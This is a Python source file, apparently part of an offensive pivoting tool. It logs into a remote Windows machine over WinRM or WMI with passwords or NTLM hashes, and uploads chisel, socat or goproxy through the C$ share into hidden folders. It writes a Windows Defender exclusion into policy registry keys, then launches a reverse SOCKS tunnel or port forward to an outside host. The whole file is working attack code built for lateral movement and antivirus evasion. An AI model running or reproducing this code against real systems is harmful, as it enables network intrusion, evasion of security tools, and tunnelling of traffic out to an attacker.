from types import SimpleNamespace as Namespace
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcomrt import DCOMConnection
from impacket.smbconnection import SMBConnection
from time import sleep
import subprocess
import winrm
import sys
import json
import auth

def addRegValue(netCommand, protocol, shellID, classObject, base, value, entryType) -> None:
    if(entryType == "regkey"):
        if(netCommand._protocol == "winrm"):
            protocol.run_command(shellID,'cmd /Q /c reg add "{base}\{value}"'.format(base=base, value=value))
        elif(netCommand._protocol == "wmi"):
            classObject.Create('cmd.exe /Q /c reg add "{base}\{value}"'.format(base=base, value=value), 'c:\\', None)
    elif(entryType == "entry"):
        if(netCommand._protocol == "winrm"):
            protocol.run_command(shellID,'cmd /Q /c reg add "{base}" /v "{value}" /t REG_SZ /d 0'.format(base=base, value=value))
            protocol.run_command(shellID,'cmd /Q /c gpupdate /force')
        elif(netCommand._protocol == "wmi"):
            classObject.Create('cmd.exe /Q /c reg add "{base}" /v "{value}" /t REG_SZ /d 0'.format(base=base, value=value), 'c:\\', None)
            classObject.Create('cmd.exe /Q /c gpupdate /force', 'c:\\', None)

def valueExistOnReg(netCommand, protocol, shellID, iWbemServices, base, value) -> bool:
    errorOutput = ""
    if(netCommand._protocol == "winrm"):
        commandID = protocol.run_command(shellID,'cmd /Q /c reg query "HKLM\{base}\{value}"'.format(base=base, value=value))
        _, errorOutput, _ = protocol.get_command_output(shellID, commandID)
        return "ERROR" in str(errorOutput)
    elif(netCommand._protocol == "wmi"):
        classObject, _ = iWbemServices.GetObject('StdRegProv')
        classObject = classObject.SpawnInstance()
        retVal = classObject.GetStringValue(2147483650, '{base}\{value}'.format(base=base, value=value), 'ImagePath')
        return retVal.ReturnValue == 2

def deployDefenderException(protocol, shellID, classObject, iWbemServices, netCommand, remoteFilePath) -> None:
    if(not valueExistOnReg(netCommand, protocol, shellID, iWbemServices, "SOFTWARE\Policies\Microsoft\Windows Defender", "Exclusions")):
        addRegValue(netCommand, protocol, shellID, classObject, "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender", "Exclusions", "regkey")

    if(not valueExistOnReg(netCommand, protocol, shellID, iWbemServices, "SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions", "Paths")):
        addRegValue(netCommand, protocol, shellID, classObject, "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions", "Paths", "regkey")
    
    addRegValue(netCommand, protocol, shellID, classObject, "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender\Exclusions\Paths", "{remoteFilePath}".format(remoteFilePath = remoteFilePath), "entry")

def getAddressInterface(interface) -> str:
    command = "ifconfig {} | grep 'inet ' | awk '{{print $2}}'".format(interface)
    process = subprocess.run(command, capture_output=True, shell=True)

    return process.stdout.strip()

def getAvailaibleExecutablePath(conn, share) -> str:
    remoteFirstOptionFilePath = "windows\system32\spool\drivers\color\Photo.gmmp"

    if(pathExist(conn, share, remoteFirstOptionFilePath)):
        return "windows\system32\spool\drivers\color"
    else:
        return "users\public\documents"

def pathExist(conn, share, remoteFilePath) -> bool:
    try:
        tid = conn.connectTree(share)
        fid = conn.openFile(tid, remoteFilePath)
        conn.closeFile(tid, fid)
        conn.disconnectTree(tid)
        return True
    except:
        return False

def deployExecutable(netCommand,remote_auth, protocol, shellID, classObject, iWbemServices) -> tuple:
    if(netCommand._command != "netsh"):
        password, lmhash, nthash = remote_auth.retrieveAuthMethodCreds()

        conn = SMBConnection(netCommand._srcaddr, netCommand._srcaddr, sess_port=445)
        conn.login(remote_auth.getUsername(), password, remote_auth.getDomain(), lmhash, nthash)

        share = "C$"
        exePath="./executables/{commnad}.exe".format(commnad = netCommand._command)

        remotePath = getAvailaibleExecutablePath(conn, share)
        remoteFilePath = "{remotePath}\{command}.exe".format(remotePath = remotePath, command = netCommand._command)

        deployDefenderException(protocol, shellID, classObject, iWbemServices, netCommand, remotePath)
        sleep(5)

        if(not pathExist(conn, share, remoteFilePath)):
            executable = open(exePath, 'rb')
            conn.putFile(share, remoteFilePath, executable.read)  
            executable.close()

        deployed = pathExist(conn,share,remoteFilePath) 

        conn.logoff()
        return deployed, remoteFilePath
    else:
        return True, None
    
def getCommandline(netCommand) -> str:
    commandline = ""

    if (netCommand._command == "chisel"):
        commandline = 'client {dstaddr}:{dstport} R:{sessionID}:socks'.format(dstaddr=netCommand._dstaddr,dstport=netCommand._dstport,sessionID=netCommand._sessionID)
    elif(netCommand._command == "socat"):
        commandline = 'TCP-LISTEN:{srcport},fork TCP:{dstaddr}:{dstport}'.format(srcport=netCommand._srcport,dstaddr=netCommand._dstaddr, dstport=netCommand._dstport)
    elif(netCommand._command == "goproxy"):
        commandline = "tcp -p ':{srcport}' -T tcp -P '{dstaddr}:{dstport}'".format(srcport=netCommand._srcport,dstaddr=netCommand._dstaddr, dstport=netCommand._dstport)
    elif(netCommand._command == "netsh"): 
        commandline = "netsh interface portproxy add v4tov4 listenaddress={srcaddr} listenport={srcport} connectaddress={dstaddr} connectport={dstport}".format(srcaddr=netCommand._srcaddr, srcport=netCommand._srcport,dstaddr=netCommand._dstaddr, dstport=netCommand._dstport)

    return commandline

def winrmConnection(netCommand,remote_auth) -> tuple:
    protocol = winrm.Protocol(endpoint='http://{host}:5985/wsman'.format(host=remote_auth.getHost()),transport='ntlm',username=r'{domain}\{user}'.format(domain=remote_auth.getDomain(),user=remote_auth.getUsername()),password=remote_auth.getPassword(),server_cert_validation='ignore')
    shellID = protocol.open_shell()

    success, remoteFilePath = deployExecutable(netCommand,remote_auth,protocol, shellID, None, None)
    if(success):
        commandID = ""
        commandline = getCommandline(netCommand)
        if(netCommand._command == "netsh"):
            commandID = protocol.run_command(shellID,"cmd /Q /c {commandline}".format(commandline = commandline))
        else:   
            commandID = protocol.run_command(shellID,"cmd /Q /c C:\{remoteFilePath} {commandline}".format(remoteFilePath = remoteFilePath, commandline = commandline))
        return shellID,commandID 
    else:
        return None,None

def wmiConnection(netCommand, remote_auth) -> tuple:
    password, lmhash, nthash = remote_auth.retrieveAuthMethodCreds()

    dcom = DCOMConnection(remote_auth.getHost(), remote_auth.getUsername(), password, remote_auth.getDomain(), lmhash, nthash)
    iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
    iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
    iWbemServices = iWbemLevel1Login.NTLMLogin('//{machine}/root/cimv2'.format(machine=remote_auth.getHost()), NULL, NULL)

    classObject,_ = iWbemServices.GetObject('Win32_Process')
    success, remoteFilePath = deployExecutable(netCommand,remote_auth,None, None, classObject, iWbemServices)  
    
    if(success):
        obj, commandID, shellID = "", "", ""
        commandline = getCommandline(netCommand)
        if(netCommand._command == "netsh"):
            obj = classObject.Create('cmd.exe /Q /c {commandline}'.format(commandline=commandline), 'c:\\', None)
            shellID, commandID = 2211, 2211
        else:
            obj = classObject.Create('cmd.exe /Q /c C:\\{remoteFilePath}\\{command}.exe {commandline}'.format(remoteFilePath=remoteFilePath.replace("\\","\\\\"), command=netCommand._command, commandline=commandline), 'c:\\', None)
            sleep(8)
            iEnumWbemClassObject = iWbemServices.ExecQuery('SELECT * FROM Win32_Process WHERE Name="{command}.exe" AND CommandLine LIKE "%{commandline}%"'.format(command=netCommand._command,commandline=commandline))
            sleep(8)
            commandID = iEnumWbemClassObject.Next(0xffffffff, 1)[0].ProcessId
            shellID = obj.getProperties()['ProcessId']['value']

        iWbemLevel1Login.RemRelease()
        iWbemServices.RemRelease()
        dcom.disconnect()

        return str(shellID),str(commandID)
    else:
        return None,None

if __name__ == "__main__":
    netCommand = json.loads(sys.argv[1][1:], object_hook=lambda d: Namespace(**d))
    remote_auth = auth.getAuth(netCommand._srcaddr)

    shellID,commandID = "",""
    if(netCommand._protocol == "winrm"):
        shellID,commandID = winrmConnection(netCommand,remote_auth)
    elif(netCommand._protocol == "wmi"):
        shellID,commandID = wmiConnection(netCommand,remote_auth)


    print(shellID+","+commandID)